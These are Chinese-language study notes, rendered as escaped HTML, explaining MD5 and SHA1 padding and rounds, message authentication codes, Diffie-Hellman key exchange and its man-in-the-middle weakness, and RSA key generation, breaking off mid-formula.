&lt;h2 id=&quot;md5&quot;&gt;MD5&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;单向散列算法&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;功能&quot;&gt;功能&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;输入任意长度的信息，经过处理，输出为128位的信息（数字指纹）；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;不同的输入得到的不同的结果（唯一性）；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;根据128位的输出结果不可能反推出输入的信息（不可逆）；&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;算法&quot;&gt;算法&lt;/h3&gt;

&lt;h4 id=&quot;填充&quot;&gt;&lt;strong&gt;填充&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;在MD5算法中，首先需要对信息进行填充，使其位长对512求余的结果等于448，&lt;strong&gt;并且填充必须进行，即使其位长对512求余的结果等于448&lt;/strong&gt;。因此，信息的位长（Bits Length）将被扩展至N*512+448，N为一个非负整数，N可以是零。&lt;/p&gt;

&lt;p&gt;填充的方法如下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;在信息的后面填充一个1和无数个0，直到满足上面的条件时才停止用0对信息的填充。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在这个结果后面附加一个以64位二进制表示的填充前信息长度（单位为Bit），如果二&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;进制表示的填充前信息长度超过64位，则取低64位。&lt;/p&gt;

&lt;p&gt;经过这两步的处理，信息的位长=N&lt;em&gt;512+448+64=(N+1）&lt;/em&gt;512，即长度恰好是512的整数倍。这样做的原因是为满足后面处理中对信息长度的要求。&lt;/p&gt;

&lt;h4 id=&quot;初始化变量&quot;&gt;&lt;strong&gt;初始化变量&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;初始的128位值为初试链接变量，这些参数用于第一轮的运算，以大端&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//baike.baidu.com/item/%E5%AD%97%E8%8A%82%E5%BA%8F&quot;&gt;字节序&lt;/a&gt;来表示，他们分别为： A=0x01234567，B=0x89ABCDEF，C=0xFEDCBA98，D=0x76543210。&lt;/p&gt;

&lt;p&gt;（每一个变量给出的数值是高字节存于内存低地址，低字节存于内存高地址，即大端字节序。在程序中变量A、B、C、D的值分别为0x67452301，0xEFCDAB89，0x98BADCFE，0x10325476）&lt;/p&gt;

&lt;h4 id=&quot;处理分组数据&quot;&gt;&lt;strong&gt;处理分组数据&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;每一分组的算法流程如下：&lt;/p&gt;

&lt;p&gt;第一分组需要将上面四个链接变量复制到另外四个变量中：A到a，B到b，C到c，D到d。从第二分组开始的变量为上一分组的运算结果，即A = a， B = b， C = c， D = d。&lt;/p&gt;

&lt;p&gt;主循环有四轮（MD4只有三轮），每轮循环都很相似。第一轮进行16次操作。每次操作对a、b、c和d中的其中三个作一次非线性函数运算，然后将所得结果加上第四个变量，文本的一个子分组和一个常数。再将所得结果向左&lt;strong&gt;环移&lt;/strong&gt;一个不定的数，并加上a、b、c或d中之一。最后用该结果取代a、b、c或d中之一。&lt;/p&gt;

&lt;p&gt;以下是每次操作中用到的四个非线性函数（每轮一个）&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;F( X ,Y ,Z ) = ( X &amp;amp; Y )&lt;/td&gt;
      &lt;td&gt;( (~X) &amp;amp; Z )&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;G( X ,Y ,Z ) = ( X &amp;amp; Z )&lt;/td&gt;
      &lt;td&gt;( Y &amp;amp; (~Z) )&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;H( X ,Y ,Z ) =X ^ Y ^ Z&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;I( X ,Y ,Z ) =Y ^ ( X&lt;/td&gt;
      &lt;td&gt;(~Z) )&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;（&amp;amp;是与（And），&lt;/td&gt;
      &lt;td&gt;是或（Or），~是非（Not），^是异或（Xor））&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;这四个函数的说明：如果X、Y和Z的对应位是独立和均匀的，那么结果的每一位也应是独立和均匀的。&lt;/p&gt;

&lt;p&gt;F是一个逐位运算的函数。即，如果X，那么Y，否则Z。函数H是逐位奇偶操作符。&lt;/p&gt;

&lt;p&gt;假设Mj表示消息的第j个子分组（从0到15），常数ti是4294967296*abs( sin(i) ）的整数部分，i 取值从1到64，单位是弧度。（4294967296=2的32次方）&lt;/p&gt;

&lt;p&gt;现定义：&lt;/p&gt;

&lt;p&gt;FF(a ,b ,c ,d ,Mj ,s ,ti ) 操作为 a = b + ( (a + F(b,c,d) + Mj + ti) « s)&lt;/p&gt;

&lt;p&gt;GG(a ,b ,c ,d ,Mj ,s ,ti ) 操作为 a = b + ( (a + G(b,c,d) + Mj + ti) « s)&lt;/p&gt;

&lt;p&gt;HH(a ,b ,c ,d ,Mj ,s ,ti) 操作为 a = b + ( (a + H(b,c,d) + Mj + ti) « s)&lt;/p&gt;

&lt;p&gt;II(a ,b ,c ,d ,Mj ,s ,ti) 操作为 a = b + ( (a + I(b,c,d) + Mj + ti) « s)&lt;/p&gt;

&lt;p&gt;现定义：&lt;/p&gt;

&lt;p&gt;FF(a ,b ,c ,d ,Mj ,s ,ti ) 操作为 a = b + ( (a + F(b,c,d) + Mj + ti) « s)&lt;/p&gt;

&lt;p&gt;GG(a ,b ,c ,d ,Mj ,s ,ti ) 操作为 a = b + ( (a + G(b,c,d) + Mj + ti) « s)&lt;/p&gt;

&lt;p&gt;HH(a ,b ,c ,d ,Mj ,s ,ti) 操作为 a = b + ( (a + H(b,c,d) + Mj + ti) « s)&lt;/p&gt;

&lt;p&gt;II(a ,b ,c ,d ,Mj ,s ,ti) 操作为 a = b + ( (a + I(b,c,d) + Mj + ti) « s)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;注意：“«”表示循环左移位，不是左移位。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;这四轮（共64步）是：&lt;/p&gt;

&lt;p&gt;第一轮&lt;/p&gt;

&lt;p&gt;FF(a ,b ,c ,d ,M0 ,7 ,0xd76aa478 )&lt;/p&gt;

&lt;p&gt;FF(d ,a ,b ,c ,M1 ,12 ,0xe8c7b756 )&lt;/p&gt;

&lt;p&gt;FF(c ,d ,a ,b ,M2 ,17 ,0x242070db )&lt;/p&gt;

&lt;p&gt;FF(b ,c ,d ,a ,M3 ,22 ,0xc1bdceee )&lt;/p&gt;

&lt;p&gt;FF(a ,b ,c ,d ,M4 ,7 ,0xf57c0faf )&lt;/p&gt;

&lt;p&gt;FF(d ,a ,b ,c ,M5 ,12 ,0x4787c62a )&lt;/p&gt;

&lt;p&gt;FF(c ,d ,a ,b ,M6 ,17 ,0xa8304613 )&lt;/p&gt;

&lt;p&gt;FF(b ,c ,d ,a ,M7 ,22 ,0xfd469501)&lt;/p&gt;

&lt;p&gt;FF(a ,b ,c ,d ,M8 ,7 ,0x698098d8 )&lt;/p&gt;

&lt;p&gt;FF(d ,a ,b ,c ,M9 ,12 ,0x8b44f7af )&lt;/p&gt;

&lt;p&gt;FF(c ,d ,a ,b ,M10 ,17 ,0xffff5bb1 )&lt;/p&gt;

&lt;p&gt;FF(b ,c ,d ,a ,M11 ,22 ,0x895cd7be )&lt;/p&gt;

&lt;p&gt;FF(a ,b ,c ,d ,M12 ,7 ,0x6b901122 )&lt;/p&gt;

&lt;p&gt;FF(d ,a ,b ,c ,M13 ,12 ,0xfd987193 )&lt;/p&gt;

&lt;p&gt;FF(c ,d ,a ,b ,M14 ,17 ,0xa679438e )&lt;/p&gt;

&lt;p&gt;FF(b ,c ,d ,a ,M15 ,22 ,0x49b40821 )&lt;/p&gt;

&lt;p&gt;第二轮&lt;/p&gt;

&lt;p&gt;GG(a ,b ,c ,d ,M1 ,5 ,0xf61e2562 )&lt;/p&gt;

&lt;p&gt;GG(d ,a ,b ,c ,M6 ,9 ,0xc040b340 )&lt;/p&gt;

&lt;p&gt;GG(c ,d ,a ,b ,M11 ,14 ,0x265e5a51 )&lt;/p&gt;

&lt;p&gt;GG(b ,c ,d ,a ,M0 ,20 ,0xe9b6c7aa )&lt;/p&gt;

&lt;p&gt;GG(a ,b ,c ,d ,M5 ,5 ,0xd62f105d )&lt;/p&gt;

&lt;p&gt;GG(d ,a ,b ,c ,M10 ,9 ,0x02441453 )&lt;/p&gt;

&lt;p&gt;GG(c ,d ,a ,b ,M15 ,14 ,0xd8a1e681 )&lt;/p&gt;

&lt;p&gt;GG(b ,c ,d ,a ,M4 ,20 ,0xe7d3fbc8 )&lt;/p&gt;

&lt;p&gt;GG(a ,b ,c ,d ,M9 ,5 ,0x21e1cde6 )&lt;/p&gt;

&lt;p&gt;GG(d ,a ,b ,c ,M14 ,9 ,0xc33707d6 )&lt;/p&gt;

&lt;p&gt;GG(c ,d ,a ,b ,M3 ,14 ,0xf4d50d87 )&lt;/p&gt;

&lt;p&gt;GG(b ,c ,d ,a ,M8 ,20 ,0x455a14ed )&lt;/p&gt;

&lt;p&gt;GG(a ,b ,c ,d ,M13 ,5 ,0xa9e3e905 )&lt;/p&gt;

&lt;p&gt;GG(d ,a ,b ,c ,M2 ,9 ,0xfcefa3f8 )&lt;/p&gt;

&lt;p&gt;GG(c ,d ,a ,b ,M7 ,14 ,0x676f02d9 )&lt;/p&gt;

&lt;p&gt;GG(b ,c ,d ,a ,M12 ,20 ,0x8d2a4c8a )&lt;/p&gt;

&lt;p&gt;第三轮&lt;/p&gt;

&lt;p&gt;HH(a ,b ,c ,d ,M5 ,4 ,0xfffa3942 )&lt;/p&gt;

&lt;p&gt;HH(d ,a ,b ,c ,M8 ,11 ,0x8771f681 )&lt;/p&gt;

&lt;p&gt;HH(c ,d ,a ,b ,M11 ,16 ,0x6d9d6122 )&lt;/p&gt;

&lt;p&gt;HH(b ,c ,d ,a ,M14 ,23 ,0xfde5380c )&lt;/p&gt;

&lt;p&gt;HH(a ,b ,c ,d ,M1 ,4 ,0xa4beea44 )&lt;/p&gt;

&lt;p&gt;HH(d ,a ,b ,c ,M4 ,11 ,0x4bdecfa9 )&lt;/p&gt;

&lt;p&gt;HH(c ,d ,a ,b ,M7 ,16 ,0xf6bb4b60 )&lt;/p&gt;

&lt;p&gt;HH(b ,c ,d ,a ,M10 ,23 ,0xbebfbc70 )&lt;/p&gt;

&lt;p&gt;HH(a ,b ,c ,d ,M13 ,4 ,0x289b7ec6 )&lt;/p&gt;

&lt;p&gt;HH(d ,a ,b ,c ,M0 ,11 ,0xeaa127fa )&lt;/p&gt;

&lt;p&gt;HH(c ,d ,a ,b ,M3 ,16 ,0xd4ef3085 )&lt;/p&gt;

&lt;p&gt;HH(b ,c ,d ,a ,M6 ,23 ,0x04881d05 )&lt;/p&gt;

&lt;p&gt;HH(a ,b ,c ,d ,M9 ,4 ,0xd9d4d039 )&lt;/p&gt;

&lt;p&gt;HH(d ,a ,b ,c ,M12 ,11 ,0xe6db99e5 )&lt;/p&gt;

&lt;p&gt;HH(c ,d ,a ,b ,M15 ,16 ,0x1fa27cf8 )&lt;/p&gt;

&lt;p&gt;HH(b ,c ,d ,a ,M2 ,23 ,0xc4ac5665 )&lt;/p&gt;

&lt;p&gt;第四轮&lt;/p&gt;

&lt;p&gt;II(a ,b ,c ,d ,M0 ,6 ,0xf4292244 )&lt;/p&gt;

&lt;p&gt;II(d ,a ,b ,c ,M7 ,10 ,0x432aff97 )&lt;/p&gt;

&lt;p&gt;II(c ,d ,a ,b ,M14 ,15 ,0xab9423a7 )&lt;/p&gt;

&lt;p&gt;II(b ,c ,d ,a ,M5 ,21 ,0xfc93a039 )&lt;/p&gt;

&lt;p&gt;II(a ,b ,c ,d ,M12 ,6 ,0x655b59c3 )&lt;/p&gt;

&lt;p&gt;II(d ,a ,b ,c ,M3 ,10 ,0x8f0ccc92 )&lt;/p&gt;

&lt;p&gt;II(c ,d ,a ,b ,M10 ,15 ,0xffeff47d )&lt;/p&gt;

&lt;p&gt;II(b ,c ,d ,a ,M1 ,21 ,0x85845dd1 )&lt;/p&gt;

&lt;p&gt;II(a ,b ,c ,d ,M8 ,6 ,0x6fa87e4f )&lt;/p&gt;

&lt;p&gt;II(d ,a ,b ,c ,M15 ,10 ,0xfe2ce6e0 )&lt;/p&gt;

&lt;p&gt;II(c ,d ,a ,b ,M6 ,15 ,0xa3014314 )&lt;/p&gt;

&lt;p&gt;II(b ,c ,d ,a ,M13 ,21 ,0x4e0811a1 )&lt;/p&gt;

&lt;p&gt;II(a ,b ,c ,d ,M4 ,6 ,0xf7537e82 )&lt;/p&gt;

&lt;p&gt;II(d ,a ,b ,c ,M11 ,10 ,0xbd3af235 )&lt;/p&gt;

&lt;p&gt;II(c ,d ,a ,b ,M2 ,15 ,0x2ad7d2bb )&lt;/p&gt;

&lt;p&gt;II(b ,c ,d ,a ,M9 ,21 ,0xeb86d391 )&lt;/p&gt;

&lt;p&gt;所有这些完成之后，将a、b、c、d分别在原来基础上再加上A、B、C、D。&lt;/p&gt;

&lt;p&gt;即a = a + A，b = b + B，c = c + C，d = d + D&lt;/p&gt;

&lt;p&gt;然后用下一分组数据继续运行以上算法。&lt;/p&gt;

&lt;h4 id=&quot;输出&quot;&gt;&lt;strong&gt;输出&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;最后的输出是a、b、c和d的级联。&lt;/p&gt;

&lt;p&gt;当你按照我上面所说的方法实现MD5算法以后，你可以用以下几个信息对你做出来的程序作一个简单的测试，看看程序有没有错误。&lt;/p&gt;

&lt;p&gt;MD5 (“”) = d41d8cd98f00b204e9800998ecf8427e&lt;/p&gt;

&lt;p&gt;MD5 (“a”) = 0cc175b9c0f1b6a831c399e269772661&lt;/p&gt;

&lt;p&gt;MD5 (“abc”) = 900150983cd24fb0d6963f7d28e17f72&lt;/p&gt;

&lt;p&gt;MD5 (“message digest”) = f96b697d7cb7938d525a2f31aaf161d0&lt;/p&gt;

&lt;p&gt;MD5 (“abcdefghijklmnopqrstuvwxyz”) = c3fcd3d76192e4007dfb496cca67e13b&lt;/p&gt;

&lt;p&gt;MD5 (“ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz”) =&lt;/p&gt;

&lt;p&gt;f29939a25efabaef3b87e2cbfe641315&lt;/p&gt;

&lt;p&gt;MD5 (“8a683566bcc7801226b3d8b0cf35fd97”) =cf2cb5c89c5e5eeebef4a76becddfcfd&lt;/p&gt;

&lt;p&gt;MD5加密字符串实例&lt;/p&gt;

&lt;p&gt;现以字符串“jklmn”为例。&lt;/p&gt;

&lt;p&gt;该字符串在内存中表示为：6A 6B 6C 6D 6E（从左到右为低地址到高地址，后同），信息长度为40 bits， 即0x28。&lt;/p&gt;

&lt;p&gt;对其填充，填充至448位，即56字节。结果为：&lt;/p&gt;

&lt;p&gt;6A 6B 6C 6D 6E 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00&lt;/p&gt;

&lt;p&gt;剩下64位，即8字节填充填充前信息位长，按小端字节序填充剩下的8字节，结果为。&lt;/p&gt;

&lt;p&gt;6A 6B 6C 6D 6E 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 28 00 00 00 00 00 00 00&lt;/p&gt;

&lt;p&gt;（64字节，512 bits）&lt;/p&gt;

&lt;p&gt;初始化A、B、C、D四个变量。&lt;/p&gt;

&lt;p&gt;将这64字节填充后数据分成16个小组（程序中对应为16个数组），即：&lt;/p&gt;

&lt;p&gt;M0：6A 6B 6C 6D （这是内存中的顺序，按照小端字节序原则，对应数组M(0)的值为0x6D6C6B6A，下同）&lt;/p&gt;

&lt;p&gt;M1：6E 80 00 00&lt;/p&gt;

&lt;p&gt;M2：00 00 00 00&lt;/p&gt;

&lt;p&gt;…..&lt;/p&gt;

&lt;p&gt;M14：28 00 00 00&lt;/p&gt;

&lt;p&gt;M15：00 00 00 00&lt;/p&gt;

&lt;p&gt;经过“&lt;strong&gt;3. 分组数据处理&lt;/strong&gt;”后，a、b、c、d值分别为0xD8523F60、0x837E0144、0x517726CA、0x1BB6E5FE&lt;/p&gt;

&lt;p&gt;在内存中为a：60 3F 52 D8&lt;/p&gt;

&lt;p&gt;b：44 01 7E 83&lt;/p&gt;

&lt;p&gt;c：CA 26 77 51&lt;/p&gt;

&lt;p&gt;d：FE E5 B6 1B&lt;/p&gt;

&lt;p&gt;a、b、c、d按内存顺序输出即为最终结果：603F52D844017E83CA267751FEE5B61B。这就是字符串“jklmn”的MD5值。&lt;/p&gt;

&lt;h2 id=&quot;sha1&quot;&gt;SHA1&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;MD5算法得出的MD5值长度为16个字节（8&lt;em&gt;16=128位） 
SHA1算法得出的SHA1值长度为20个字节（8&lt;/em&gt;20=160位）&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;算法-1&quot;&gt;算法&lt;/h3&gt;

&lt;h4 id=&quot;填充信息&quot;&gt;填充信息&lt;/h4&gt;

&lt;p&gt;和MD5算法类似，对信息的第一步也是填充信息直至满足条件。&lt;/p&gt;

&lt;p&gt;填充的过程如下：
1.先判断文件（消息）的大小（长度） mod 512 == 448 mod 512 ，就是大小（长度）对512求余等于448。（这里的512、448是“位”为单位，转成“字节”就是64、56，即mod 64 == 56 mod 64）&lt;/p&gt;

&lt;p&gt;2.如果大小（长度）满足 mod 512 == 448 mod 512，就在文件（消息）的末尾处添加64位（8字节）的值，值的内容是原消息的长度（以位为单位）&lt;/p&gt;

&lt;p&gt;3.如果大小（长度）不满足要求，就执行以下操作：
（1）填充1个1
（2）填充0，直到满足满足过程的第一步。&lt;/p&gt;

&lt;p&gt;注意：这里是以位为单位，假如是以字节为单位，第一个填充的是0x80（1000 0000），然后就填0x0
举例：消息内容为“gnubd”，就能得到以下内容&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-reStructuredText&quot;&gt;67 6E 62 75 64 80 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 28 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;还需要注意到的是最后原消息的长度是以大端存储的方式存到内存中的，这里与MD5的存储是有区别的。&lt;/p&gt;

&lt;p&gt;….&lt;/p&gt;

&lt;h1 id=&quot;消息认证&quot;&gt;消息认证&lt;/h1&gt;

&lt;h2 id=&quot;作用目的&quot;&gt;作用&amp;amp;目的&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;验证信息来源的真实性&lt;/li&gt;
  &lt;li&gt;验证消息的完整性&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;认证函数实现&quot;&gt;认证函数实现&lt;/h2&gt;

&lt;h3 id=&quot;消息认证码mac&quot;&gt;消息认证码(MAC)&lt;/h3&gt;

&lt;p&gt;消息认证码的输入包括任意长度的消息和一个发送者与接收者之间的共享的密钥，它可以输出固定长度的数据，这个数据成为&lt;strong&gt;MAC值&lt;/strong&gt;。
 根据任意长度的雄性输出固定长度的数据，这一点和散列函数很类似。但是单向散列函数中计算散列值时不需要密钥，相对地，消息认证码中则需要使用发送者与接收者之间的共享密钥。
 要计算MAC必须持有共享密钥，没有共享密钥的人就无法计算MAC值，消息认证正是利用这一性质来完成认证的。此外，和单向散列函数的散列值一样，哪怕消息中发生1比特的变化，MAC值一会产生变化，消息认证码正是利用这一性质来确认完整性的。
 &lt;strong&gt;消息认证码是一种与密钥相关联的单向散列函数&lt;/strong&gt;&lt;/p&gt;

&lt;h3 id=&quot;基于des消息认证码&quot;&gt;基于DES消息认证码&lt;/h3&gt;

&lt;h3 id=&quot;基于hash消息认证码&quot;&gt;基于Hash消息认证码&lt;/h3&gt;

&lt;h4 id=&quot;hmac算法&quot;&gt;HMAC算法&lt;/h4&gt;

&lt;p&gt;….&lt;/p&gt;

&lt;h1 id=&quot;公钥密码&quot;&gt;公钥密码&lt;/h1&gt;

&lt;h2 id=&quot;提出原因&quot;&gt;提出原因&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;秘钥分发问题&lt;/li&gt;
&lt;/ul&gt;

&lt;ol&gt;
  &lt;li&gt;密钥更新共享的方式有以下几种类型：
A 选择密钥并手工传递给 B,在这样的一个情境中，A 和 B都是确实存在且可信的。而在互联网环境中，A 和 B 之间要建立信任关系，会很困难。&lt;/li&gt;
  &lt;li&gt;第三方 C 选择密钥分别手工传递给 A , B,在复杂的互联网环境中，C 如何将密钥安全的分发给 A和B，要保证其安全性也很困难。&lt;/li&gt;
  &lt;li&gt;用 A , B 原有共享密钥传送新密钥,这是一种相对安全的方式，但是互联网环境中需要A和B要有一份复杂的密钥交换协议，才可以实现新密钥的共享。&lt;/li&gt;
  &lt;li&gt;与 A , B 分别有共享密钥的第三方 C 传送新密钥给 A 和（或） B,此过程也需要一份复杂的密钥交换协议来确保C能够将密钥安全的分发给 A 和 B。&lt;/li&gt;
&lt;/ol&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;秘钥管理问题&lt;/p&gt;

    &lt;p&gt;除了密钥的更新问题困难以外，还有对密钥管理的问题仍然存在。在对称密码算法中必须要对密钥进行管理，但是对密钥的管理又十分的困难。&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;例如：&lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt;  N 个用户集需要 N(N-1)/2 个共享密钥，当用户量增大时，密钥空间急剧增大。&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;n = 100 时，  C(100,2) = 4,995&lt;/li&gt;
      &lt;li&gt;n = 5000时， C(5000,2) = 12,497,500&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;数字签名问题&lt;/p&gt;

    &lt;p&gt;传统加密算法无法实现抗抵赖的需求。在对称加密算法中，共享的密钥是通信双方都知道的 ，所以无法使用共享的密钥来对对方的身份进行确认。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;单向陷门函数&quot;&gt;单向陷门函数&lt;/h2&gt;

&lt;p&gt;单向陷门函数可以被定义为如下函数f：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;给出f的定义域中的任意元素x,  f(x)的计算是容易的；&lt;/li&gt;
  &lt;li&gt;给出y=f (x)中的y要计算x时，若知道设计函数f时结合进去的某种信息（该信息称为陷门），则容易计算；若不知道该信息，则难以计算。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;目前人们主要是基于如下的数学上的困难问题来设计单向函数和公钥密码体制：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;大整数分解问题(如公钥密码体制RSA)；&lt;/li&gt;
  &lt;li&gt;有限域上的离散对数问题(如公钥密码体制ElGamal):&lt;/li&gt;
  &lt;li&gt;椭圆曲线上的离散对数问题(如公钥密码体制ECC)。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;为什么要用公钥密码&quot;&gt;为什么要用公钥密码&lt;/h2&gt;

&lt;p&gt;（1） 机密性的实现
发送方用接收方的公钥加密消息，接收方用自己的私钥来解密。
（2） 数字签名
发送方用自己的私钥来签名消息，接收方通过发送方对应的公钥来鉴别消息，并且发送方不能对自己的签名进行否认。
（3） 密钥分发和协商
发送方和接收方基于公钥密码系统容易实现在公开信道上的大规模的密钥分发和协商。&lt;/p&gt;

&lt;h2 id=&quot;dh秘钥交换&quot;&gt;DH秘钥交换&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;DH，全称为“Diffie-Hellman”，这是一种确保共享KEY安全穿越不安全网络的方法，换句话说就是密钥一致协议，由公开密钥密码体制的奠基人Diffie和Hellman所提出的一种思想&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;简单的说就是允许两名用户在公开媒体上交换信息以生成“一致”的、可以共享的密钥。也就是由甲方产出一对密钥（公钥、私钥），乙方依照甲方公钥产生乙方密钥对（公钥、私钥）。它可以让双方在完全没有对方任何预先信息的条件下通过不安全信道建立起一个密钥。这个密钥可以在后续的通讯中作为对称密钥来加密通讯内容。&lt;/p&gt;

&lt;h3 id=&quot;dh密钥交换模型分析&quot;&gt;DH密钥交换模型分析&lt;/h3&gt;

&lt;p&gt;我们还是以甲乙双方发送数据为模型进行分析&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;甲方（消息发送方，下同）构建密钥对（公钥+私钥），甲方公布公钥给乙方（消息接收方，下同）&lt;/li&gt;
  &lt;li&gt;乙方以甲方发送过来的公钥作为参数构造密钥对（公钥+私钥），将构造出来的公钥公布给甲方&lt;/li&gt;
  &lt;li&gt;甲方用“甲方的私钥+乙方的公钥”构造本地密钥&lt;/li&gt;
  &lt;li&gt;乙方用“乙方的私钥+甲方的公钥”构造本地的密钥&lt;/li&gt;
  &lt;li&gt;这个时候，&lt;strong&gt;甲乙两方本地新构造出来的密钥应该一样&lt;/strong&gt;，甲乙双方可以通过本地密钥进行数据的加密和解密&lt;/li&gt;
  &lt;li&gt;然后就可以&lt;strong&gt;使用AES这类对称加密算法进行数据的安全传送&lt;/strong&gt;了。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;dh数学原理&quot;&gt;DH数学原理&lt;/h3&gt;

&lt;p&gt;有两个全局公开的参数，一个素数p和一个整数g，g是p的一个原根。&lt;/p&gt;

&lt;p&gt;服务端的私钥和公钥分别是a和A，客户端的私钥和公钥分别是b和B；&lt;/p&gt;

&lt;p&gt;服务端根据a、p、g，可以计算出公钥A；&lt;/p&gt;

&lt;p&gt;服务端将g, p, A明文传送给客户端，客户端可以计算自己的公钥B，以及共享密钥K；&lt;/p&gt;

&lt;p&gt;客户端将B明文发送给服务端，服务端也可以计算出共享密钥K。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/DH.png&quot; alt=&quot;DH&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;安全问题-中间人攻击&quot;&gt;安全问题-中间人攻击&lt;/h3&gt;

&lt;p&gt;在最初的描述中，迪菲-赫尔曼密钥交换本身并没有提供通讯双方的身份验证服务，因此它很容易受到中间人攻击。 
一个中间人“丙”在信道的中央进行两次迪菲－赫尔曼密钥交换，一次和甲，另一次和乙，就能够成功的向甲假装自己是乙，反之亦然。
而攻击者可以解密（读取和存储）任何一个人的信息并重新加密信息，然后传递给另一个人。因此通常都需要一个能够验证通讯双方身份的机制来防止这类攻击。
&lt;strong&gt;有很多种安全身份验证解决方案使用到了迪菲－赫尔曼密钥交换。例如当甲和乙共有一个公钥基础设施时，可以将他们的返回密钥进行签名。&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;rsa&quot;&gt;RSA&lt;/h2&gt;

&lt;p&gt;RSA公钥算法是由 MIT (麻省理工学院, Massachusetts Institute of Technology) 的Rivest, Shamir和Adleman在1978年提出来的。RSA方案是被最广泛接受并实现的通用公开密钥密码算法，目前已成为公钥密码的国际标准。该算法的数学基础是初等数论中的欧拉定理，其安全性建立在大整数因子分解的困难性之上。&lt;/p&gt;

&lt;h3 id=&quot;密钥的生成&quot;&gt;密钥的生成&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;选择两个大素数 &lt;code&gt;p&lt;/code&gt;，&lt;code&gt;q&lt;/code&gt;，（p，q为互异素数，需要保密）&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;计算&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;n= p *q\\
\Phi(n)=(p-1)*(q-1)&lt;/script&gt;

&lt;ul&gt;
  &lt;li&gt;选择整数 &lt;code&gt;e&lt;/code&gt; 使&lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
gcd(\phi(n),e)=1\\
1 &lt; e &lt;\phi(n) %]]&gt;&lt;/script&gt;

&lt;ul&gt;
  &lt;li&gt;计算d&lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;d*e=1mod\phi(n)&lt;/script&gt;

&lt;p&gt;得到：公钥 为&lt;code&gt;{e,n}&lt;/code&gt;； 私钥为&lt;code&gt;{d}&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;加密-1&quot;&gt;加密&lt;/h3&gt;

&lt;p&gt;明文:M&lt;/p&gt;

&lt;p&gt;密文:&lt;/p&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
接受(e,n)\\
